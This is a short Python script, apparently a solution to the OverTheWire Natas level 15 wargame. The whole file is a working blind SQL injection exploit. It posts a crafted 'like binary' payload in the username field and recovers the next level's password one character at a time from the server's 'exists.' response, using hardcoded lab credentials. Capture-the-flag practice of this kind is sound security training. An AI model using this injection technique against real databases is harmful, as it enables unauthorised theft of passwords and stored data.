import string
import requests
from requests.auth import HTTPBasicAuth

DEBUG = True

AUTH = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
URL = 'http://natas15.natas.labs.overthewire.org/'

def fn(known):
	if len(known) == 33:
		return known[:-1]

	for c in (string.ascii_letters + string.digits):
		k = known[:-1] + c + '%'

		if DEBUG:
			print('*** Trying with {}'.format(k))

		payload = 'natas16" and password like binary "' + k 
		r = requests.post(URL, auth=AUTH, data={'username': payload})
		if 'exists.' in r.text:
			if DEBUG:
				print('!!! Success!, found {}'.format(k))
			return fn(k)

	if DEBUG:
		print('Nothing found. :(')

print(fn('%'))
